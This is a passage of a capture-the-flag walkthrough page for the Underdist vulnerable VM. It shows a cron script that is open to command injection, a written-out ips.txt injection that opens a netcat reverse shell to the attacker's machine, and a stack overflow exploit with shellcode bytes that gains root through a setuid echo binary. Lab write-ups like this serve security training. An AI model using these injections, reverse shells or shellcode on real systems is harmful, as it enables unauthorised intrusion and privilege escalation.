+<span class="go">ls -al</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> .bin  <span class="c1"># this looks interesting, but inaccessible for now</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> cronping.py
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> ips.txt
+<span class="go">cat cronping.py</span>
+<span class="go">cat ips.txt</span>
+</pre></div>
+</div>
+<p><strong class="program">cronping.py</strong> takes <code class="file docutils literal"><span class="pre">ips.txt</span></code> and injects the lines into <strong class="program">os.open()</strong>. So rather than IPs, <code class="file docutils literal"><span class="pre">ip.txt</span></code> could be most any shell command.</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">def</span> <span class="nf">ips</span><span class="p">():</span>
+    <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&quot;ips.txt&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">f</span>
+
+<span class="k">def</span> <span class="nf">save</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
+    <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/tmp/logs&quot;</span><span class="p">,</span> <span class="s2">&quot;a+&quot;</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">command</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ping -c 1 -w 1 </span><span class="si">%s</span><span class="s1">|grep received|cut -d &quot; &quot; -f 4&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">verify</span><span class="p">():</span>
+    <span class="n">save</span><span class="p">(</span><span class="s2">&quot;- - - - - - - - - - - - - - - - - - - - - - - - -</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">ips</span><span class="p">():</span>
+        <span class="n">ip</span><span class="o">=</span><span class="n">ip</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">command</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">==</span><span class="s2">&quot;1</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">:</span>
+            <span class="n">save</span><span class="p">(</span><span class="s2">&quot;Host </span><span class="si">%s</span><span class="s2"> Up</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">save</span><span class="p">(</span><span class="s2">&quot;Host </span><span class="si">%s</span><span class="s2"> Down</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">))</span>
+
+<span class="n">verify</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><code class="file docutils literal"><span class="pre">ips.txt</span></code> is a list of IP addresses, but can be anything and user cuervo has write access.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">198.27.100.204</span>
+<span class="go">31.13.85.33</span>
+<span class="go">173.194.42.63</span>
+<span class="go">23.76.228.226</span>
+<span class="go">72.21.81.85</span>
+<span class="go">185.12.13.15</span>
+</pre></div>
+</div>
+<p>We can only hope that <code class="file docutils literal"><span class="pre">cronping.py</span></code> is an underdist cron job. With <code class="file docutils literal"><span class="pre">ips.txt</span></code> injecting into <code class="file docutils literal"><span class="pre">cronping.py</span></code>, cuervo can execute arbitrary commands as underdist. There are several approaches that can be taken. Here we start up a reverse shell listener on Kali first (run the <code class="docutils literal"><span class="pre">id</span></code> command :</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>socat - TCP-LISTEN:<span class="nv">$PORT</span>
+id
+</pre></div>
+</div>
+<p>Now set up <code class="file docutils literal"><span class="pre">ips.txt</span></code> to start a reverse shell (substitue in your Kali IP and port):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">MYIP</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="nv">MYPORT</span><span class="o">=</span><span class="m">4444</span>
+cat &gt; ips.txt <span class="s">&lt;&lt;EOF</span>
+<span class="s">127.0.0.1 ; nc $MYIP $MYPORT -e /bin/bash ; echo nothing</span>
+<span class="s">EOF</span>
+</pre></div>
+</div>
+<p>And popping on the Kali side (should be within a minute) the shell pops and we get our first glimpse of <code class="file docutils literal"><span class="pre">.bin</span></code>:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">id</span>
+<span class="go">python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="go">export TERM=linux</span>
+<span class="go">ls -al .bin</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> -rwsr-xr-x <span class="m">1</span> root      root      <span class="m">4986</span> oct <span class="m">27</span>  <span class="m">2014</span> <span class="nb">echo</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="getting-root-from-setuid-root-program-bin-echo">
+<h4>3.9.3.2.2. Getting root from setuid root program <strong class="program">.bin/echo</strong><a class="headerlink" href="#getting-root-from-setuid-root-program-bin-echo" title="Permalink to this headline">¶</a></h4>
+<p>Now that setuid root <code class="docutils literal"><span class="pre">echo</span></code> just has to be exploitable. We present here an exploit that doesn’t require <strong class="program">gdb</strong>, just the bash script <strong class="program">checksec</strong> (and even that really isn’t required).</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">cd .bin</span>
+<span class="go">./echo</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> Violación de segmento
+</pre></div>
+</div>
+<p>Wow - already a segment violation. We need <a class="reference external" href="https://github.com/slimm609/checksec.sh">checksec.sh</a> to analyze this binary:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">wget --quiet https://raw.githubusercontent.com/slimm609/checksec.sh/master/checksec</span>
+<span class="go">chmod +x checksec</span>
+<span class="go">./checksec --file ./echo</span>
+</pre></div>
+</div>
+<p>The analysis reveals:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    FORTIFY FORTIFIED FORTIFY-able  FILE</span>
+<span class="go">No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No    0               2       ./echo</span>
+</pre></div>
+</div>
+<p>No RELRO, no stack canaries, and the stack is executable - how much easier can they make it? We will vaguely follow <a class="reference external" href="http://blairmason.me/iwg/exploit/walkthrough/">Simple exploit walkthrough</a>, though our walkthrough will be even simpler.</p>
+<p>In general we have a stack overflow and we want to figure out how many bytes are needed to overwrite the return address: that is, how many bytes does it take to get a segmentation fault? With a hand-done binary search we discover it takes 304, and we show ‘FEEDBEEF’ clobbers the EIP instruction pointer:</p>
+<div class="highlight-none"><div class="highlight"><pre><span></span>./echo $(python -c &quot;print 303*&#39;A&#39;&quot;)
+# NO SEGFAULT
+./echo $(python -c &quot;print 304*&#39;A&#39;&quot;)
+# OUTPUT = Violación de segmento
+# Show we can write FEEDBEEF to the ip (little-endian it&#39;s &#39;\xEF\xBE\xED\xFE&#39;)
+./echo $(python -c &quot;print 304*&#39;A&#39; + &#39;\xEF\xBE\xED\xFE&#39;&quot;)
+# OUTPUT = Violación de segmento
+dmesg | grep segfault | tail -n 1
+<span class="hll"># OUTPUT = [33607.444577] echo[12083]: segfault at feedbeef ip feedbeef sp bffff750 error 5
+</span></pre></div>
+</div>
+<p>The segfault says the code should be somewhere around the stack pointer address 0xbffff750 so we’ll start by changing the 0xFEEDBEEF (‘xEFxBExEDxFE’ little-endian) to that address. In case the address is not exact we’ll change the ‘A’ to ‘x90’ (the NOP command), providing a “NOP sled” up to our exploit code. And we’ll change the last bytes of the NOP sled to an actual shellcode exploit. The exploit we’ll choose is <a class="reference external" href="http://shell-storm.org/shellcode/files/shellcode-752.php">http://shell-storm.org/shellcode/files/shellcode-752.php</a> (21 bytes long), so our NOP sled will be 304-21= 283 bytes. Here goes our first attempt (knowing that the starting with the stack pointer may not work):</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">./echo $(python -c &quot;print (283*&#39;\x90&#39; + \</span>
+<span class="go">    &#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68&#39; + \</span>
+<span class="go">    &#39;\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd&#39; + \</span>
+<span class="go">    &#39;\x80&#39; + \</span>
+<span class="hll"><span class="go">    &#39;\x50\xf7\xff\xbf&#39;) &quot;)</span>
+</span><span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> Violación de segmento
+</pre></div>
+</div>
+<p>That didn’t work. So we’ll bump up the address by half the NOP sled size (128 or 0x80) until we get success (here at 0xbffff930). You may have to bump it up to a higher number:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">./echo $(python -c &quot;print (283*&#39;\x90&#39; + \</span>
+<span class="go">    &#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68&#39; + \</span>
+<span class="go">    &#39;\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd&#39; + \</span>
+<span class="go">    &#39;\x80&#39; + \</span>
+<span class="hll"><span class="go">    &#39;\x30\xf9\xff\xbf&#39;) &quot;)</span>
+</span><span class="gp">#</span> Prompt changes to <span class="c1">#</span>
+<span class="go">id</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> <span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>underdist<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>underdist<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>underdist<span class="o">)</span>
+<span class="go">ls /root</span>
+<span class="gp">#</span> <span class="nv">OUTPUT</span> <span class="o">=</span> flag.txt  r.sh
+<span class="go">cat /root/flag.txt</span>
+
+
+<span class="go">                        (`.         ,-,</span>
+<span class="go">                        ` `.    ,;&#39; /</span>
+<span class="go">                         `.  ,&#39;/ .&#39;</span>
+<span class="go">                          `. X /.&#39;</span>
+<span class="go">                .-;--&#39;&#39;--.._` ` (</span>
+<span class="go">              .&#39;            /   `</span>
+<span class="go">             ,           ` &#39;   Q &#39;</span>
+<span class="go">             ,         ,   `._    \</span>
+<span class="go">          ,.|         &#39;     `-.;_&#39;</span>
+<span class="go">          :  . `  ;    `  ` --,.._;</span>
+<span class="go">           &#39; `    ,   )   .&#39;</span>
+<span class="go">              `._ ,  &#39;   /_</span>
+<span class="go">                 ; ,&#39;&#39;-,;&#39; ``-</span>
+<span class="go">                  ``-..__``--`</span>
+
+
+<span class="go">                        http://underc0de.org</span>
+
+
+
+<span class="go">Felicidades H4x0r! resolviste el reto!</span>
+
+<span class="go">Mandame tu solucionario a: a.denegado@gmail.com</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="kioptrix5.html" class="btn btn-neutral float-right" title="3.10. Kioptrix Level 5" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="de-ice1.html" class="btn btn-neutral" title="3.8. De-ICE Level 1" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
